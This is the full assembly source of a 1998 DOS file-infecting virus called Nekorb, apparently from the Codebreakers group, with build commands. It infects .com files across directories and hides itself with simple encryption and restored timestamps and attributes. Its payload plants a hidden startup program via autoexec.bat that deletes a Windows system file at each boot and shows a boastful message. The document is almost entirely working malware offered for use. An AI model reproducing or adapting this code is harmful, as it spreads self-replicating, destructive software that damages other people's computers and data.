; ------------------------------------------------------------------------- ;
;          Nekorb v1.5 coded by KilJaeden of the Codebreakers 1998          ;
; ------------------------------------------------------------------------- ;
; Description: `-------------------| Started: 10/06/98 | Finished: 11/06/98 ;
;                                  `-------------------^------------------- ;
; v1.0 - start with a simple *.com appender                     | Size: 824 ;
; v1.1 - time / date restoration                                `---------- ;
; v1.2 - add XOR,NEG,NOT,ROR encryption and directory changing              ;
; v1.3 - infects files with any attributes (readonly/hidden/sys)            ;
; v1.4 - saves / restores file attributes now                               ;
; v1.5 - the craziest payload I have ever done... how to explain this...!   ;
;      - 1: infects all the .coms it can, and then jumps to c:\             ;
;      - 2: finds the autoexec.bat file, if there is none, one is created   ;
;      - 3: infects either the old, or the new, autoexec.bat file replacing ;
;      -    the first line of it, so it executes a .com everytime the       ;
;      -    computer is started up! read only and hides the autoexec.bat    ;
;      - 4: creates the new .com that the autoexec.bat runs on startup      ;
;      - 5: that new .com jumps to the \windows\system directory, and       ;
;      -    deletes one file, prints a message, and waits for the infected  ;
;      -    user to press any key (just to make sure they see us)           ;
;      -    the new .com is made read only / hidden as well                 ;
; ------------------------------------------------------------------------- ;
; ----------------------> For Christine Moore <---------------------------- ;
; ------------------------------------------------------------------------- ;
; to compile ::] tasm nekorb.asm                                            ;
; to link :::::] tlink /t nekorb.obj                                        ;
; ------------------------------------------------------------------------- ;

code    segment                         ; name our segment 'code'
        assume  cs:code,ds:code         ; assign CS and DS to code
        org     100h                    ; this be a .com file

blank:  db      0e9h,0,0                ; define the blank jump
start:  call    delta                   ; push IP on to stack
delta:  pop     bp                      ; pop into BP
        sub     bp,offset delta         ; get the delta offset

encst:  jmp     not1st                  ; jump to not1st (overwritten)
        lea     si,[bp+encd]            ; points to encrypted area start
        mov     di,si                   ; move the value into DI
        call    encr                    ; call the de/encryption routine
        jmp     encd                    ; jump to start of encrypted stuff

encr:   lodsb                           ; load a byte
        not     al                      ; encryptin 1
        ror     al,4                    ; encryptin 2
        neg     al                      ; encryptin 3
        xor     al,byte ptr [bp+key]    ; encryptin 4 -final-
        neg     al                      ; unencrypt 3
        ror     al,4                    ; unencrypt 2
        not     al                      ; unencrypt 1
        stosb                           ; stores the byte
        loop    encr                    ; does all the bytes
        ret                             ; returns from call

        key     db 0                    ; our key

encd:   lea     si,[bp+buffer]          ; three bytes to restore
        mov     di,100h                 ; load di with 100h
        push    di                      ; save this for the 'retn'
        movsw                           ; move two bytes
        movsb                           ; move one byte

        lea     dx,[bp+offset dta]      ; new DTA address
        mov     ah,1ah                  ; move the dta
        int     21h                     ; DTA is moved

first:  mov     ah,4eh                  ; find the first file
        lea     dx,[bp+comfile]         ; looking for *.c*
        mov     cx,7                    ; with these attributes

next:   int     21h                     ; find the first .com
        jnc     infect                  ; found one? infect it
        mov     ah,3bh                  ; change directory
        lea     dx,[bp+updir]           ; load the .. string
        int     21h                     ; now up a directory
        jnc     first                   ; jump to first
        jmp     pload                   ; hit root? do our payload

infect: lea     dx,[bp+offset dta+1eh]  ; get the file info
        mov     ax,4300h                ; get file attributes
        int     21h                     ; we have them now
        push    cx                      ; save value #1
        push    dx                      ; save value #2
        push    ds                      ; save value #3
        
        mov     ax,4301h                ; set file attributes
        xor     cx,cx                   ; to none at all
        int     21h                     ; ready for infection

        call    open                    ; open the file

        mov     ax,5700h                ; get time / date stamps
        int     21h                     ; get them now
        push    dx                      ; save value #4
        push    cx                      ; save value #5

        mov     ah,3fh                  ; read record function
        lea     dx,[bp+buffer]          ; to the buffer
        mov     cx,3                    ; three bytes
        int     21h                     ; read those bytes

        mov     ax,word ptr [bp+dta+1ah]    ; move the file size into AX
        mov     cx,word ptr [bp+buffer+1]   ; move the buffer + 1 into cx
        add     cx,finish-start+3           ; add virus size + jump
        cmp     ax,cx                       ; compare the two
        jz      shutup                      ; if equal close the file
        cmp     ax,1000                     ; compare file size with 1kb
        jb      shutup                      ; file is too small, close it up
        cmp     ax,62000                    ; compare file size with 62kb
        ja      shutup                      ; file is too big, close it up

        sub     ax,3                        ; get jump to virus body size
        mov     word ptr [bp+newjump+1],ax  ; write this as our jump

        mov     al,00h                  ; start of file
        call    scan                    ; scan to start of file

        mov     ah,40h                  ; write to file
        lea     dx,[bp+newjump]         ; write this
        mov     cx,3                    ; # of bytes to write
        int     21h                     ; write it now

        mov     al,02h                  ; end of file
        call    scan                    ; scan to end of file

        in      al,40h                  ; get a random value
        mov     byte ptr [bp+key],al    ; save it as our key
 
        mov     ah,40h                  ; write to file
        lea     dx,[bp+start]           ; where to start writting
        mov     cx,encd-start           ; # of bytes to write
        int     21h                     ; write the non-encrypted stuff

        lea     di,[bp+finish]          ; load DI with end address
        push    di                      ; save value #6
        lea     si,[bp+encd]            ; load SI with start address
        mov     cx,finish-encd          ; # of bytes between the two
        push    cx                      ; save value #7
        call    encr                    ; call the encryption routine

        mov     ah,40h                  ; write to file
        pop     cx                      ; saved value #7
        pop     dx                      ; saved value #6
        int     21h                     ; write those bytes

shutup: mov     ax,5701h                ; set time / date
        pop     cx                      ; from saved value #5
        pop     dx                      ; from saved value #4
        int     21h                     ; time / date restored

        mov     ax,4301h                ; set file attributes
        pop     ds                      ; from saved value #3
        pop     dx                      ; from saved value #2
        pop     cx                      ; from saved value #1
        int     21h                     ; set them now

        call    close                   ; close the file
        mov     ah,4fh                  ; find next file
        jmp     next                    ; jump to next

exit:   mov     dx,80h                  ; old address of DTA
        mov     ah,1ah                  ; restore to original location
        int     21h                     ; DTA is back to original location
        retn                            ; return control to host

; ---------------------------( The Payload )------------------------------- ;
; ------------------------------------------------------------------------- ;

pload:  mov     ah,0eh                  ; change drive
        mov     dl,2                    ; to drive c:\
        int     21h                     ; now in c:\
        mov     ah,3bh                  ; change directory
        lea     dx,[bp+rootdir]         ; to the root directory
        int     21h                     ; change now

find:   mov     ah,4eh                  ; find first file
        lea     dx,[bp+autoexe]         ; named 'autoexec.bat'
        mov     cx,7                    ; possible attributes
        int     21h                     ; find it now
        jnc     infkt                   ; found it? infect it now

        mov     ah,3ch                  ; make a file
        lea     dx,[bp+autoexe]         ; named 'autoexec.bat'
        xor     cx,cx                   ; normal attributes
        int     21h                     ; make it now
        jmp     find                    ; and try again

infkt:  lea     dx,[bp+offset dta+1eh]  ; get the file info
        push    dx                      ; save value #8
        mov     ax,4301h                ; set file attributes
        xor     cx,cx                   ; to none at all
        int     21h                     ; set them now
        call    open                    ; open the file

        mov     ah,40h                  ; write to file
        lea     dx,[bp+newline]         ; write the new line
        mov     cx,13                   ; this many bytes
        int     21h                     ; write to file

        pop     dx                      ; from saved value #8
        mov     ax,4301h                ; set file attributes
        mov     cx,3                    ; read only / hidden
        int     21h                     ; set them now

        call    close                   ; close the autoexec.bat

        mov     ah,3ch                  ; create a file
        lea     dx,[bp+pldfile]         ; with this name
        push    dx                      ; save value #9
        xor     cx,cx                   ; with no attributes
        int     21h                     ; create it now

        mov     ah,4eh                  ; find the first file
        pop     dx                      ; from saved value #9
        mov     cx,7                    ; with these possible attributes
        int     21h                     ; find it now

        lea     dx,[bp+offset dta+1eh]  ; get the file name info
        push    dx                      ; save value #10
        call    open                    ; open the file

        mov     ah,40h                  ; write to file
        lea     dx,[bp+pstrt]           ; write from here
        mov     cx,pend-pstrt           ; this # of bytes
        int     21h                     ; write them now

        pop     dx                      ; from saved value #10
        mov     ax,4301h                ; set file attributes
        mov     cx,3                    ; read only / hidden
        int     21h                     ; set them now

        call    close                   ; close winsys.com
        jmp     exit                    ; end the virus

; ---------------------( Remotely Called Procedures )---------------------- ;
; ------------------------------------------------------------------------- ;

close:  mov     ah,3eh                  ; close file
        int     21h                     ; close it now
        ret

open:   mov     ax,3d02h                ; open the file
        int     21h                     ; file is opened
        xchg    bx,ax                   ; move the info
        ret                             ; return from call

scan:   mov     ah,42h                  ; scan function
        xor     cx,cx                   ; cx must be 0
        cwd                             ; likewize for DX
        int     21h                     ; scan through file
        ret                             ; return from call

; -----------------------( The Payload Data Area )------------------------- ;
; ------------------------------------------------------------------------- ;

pstrt:  db      0e9h,0,0                ; need all this again
        call    paydel                  ; push IP on to stack
paydel: pop     bp                      ; pop it into bp
        sub     bp,offset paydel        ; get 2nd delta offset

        mov     ah,3bh                  ; change directory
        lea     dx,[bp+winsys]          ; \windows\system
        int     21h                     ; go there now

        mov     ah,4eh                  ; find first file
        lea     dx,[bp+anyfile]         ; with any name *.*
        mov     cx,7                    ; with these possible attributes
        int     21h                     ; find one now

        mov     ah,41h                  ; delete a file
        mov     dx,9eh                  ; with this name
        int     21h                     ; delete it

        mov     ah,3bh                  ; change directory
        lea     dx,[bp+root]            ; back to the root dir
        int     21h                     ; go there now

        mov     ah,09h                  ; print a message
        lea     dx,[bp+paymsg]          ; this message
        int     21h                     ; print it to the screen
        mov     ah,00h                  ; wait for keypress
        int     16h                     ; let them seeeeee hehehe
        int     20h                     ; end this program
        anyfile db '*.*',0              ; find *.*
        winsys  db "\windows\system",0  ; define directory to change to
        root    db "\",0                ; change to the root dir
        paymsg  db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db '',10,13             ; so they don't see winsys.com exec
                db 'Infected by Nekorb coded by KilJaeden of the Codebreakers on 10/06/98 - 11/06/98',10,13
                db '::Each time you start your computer, an innocent file is sacrificed to my god.::',10,13,'$'
pend:

; --------------------------( The Data Area )------------------------------ ;
; ------------------------------------------------------------------------- ;

        newline db '.\winsys.com',10,13,'$'
        updir   db "..",0               ; define the .. string
        comfile db "*.com",0            ; define the *.c* string
        autoexe db 'autoexec.bat',0     ; name of file to find
        buffer  db 0cdh,20h,0           ; terminates 1st gen
        rootdir db "\",0                ; change to the root dir
        pldfile db 'winsys.com',0       ; the name for our new .com
        newjump db 0e9h,0,0             ; overwriten 1st gen
        dta db 43 dup (?)               ; space for the new DTA
        finish  label near              ; an offset label

; ---------------------( Not Saved / Not Encrypted )----------------------- ;
; ------------------------------------------------------------------------- ;

not1st: lea     di,[bp+encst]           ; where to move the bytes
        lea     si,[bp+new]             ; move these bytes
        movsw                           ; move two bytes
        movsb                           ; move one more
        jmp     encd                    ; jump to encrypted area

new:    mov     cx,finish-encd          ; this will overwrite the jump

; -----------------------------( The End )--------------------------------- ;
; ------------------------------------------------------------------------- ;

        code    ends                    ; end code segment
        end     blank                   ; end / where to start

; ------------------------------------------------------------------------- ;
; ---------> How Can You Think Freely In The Shadow Of A Church? <--------- ;
; ------------------------------------------------------------------------- ;
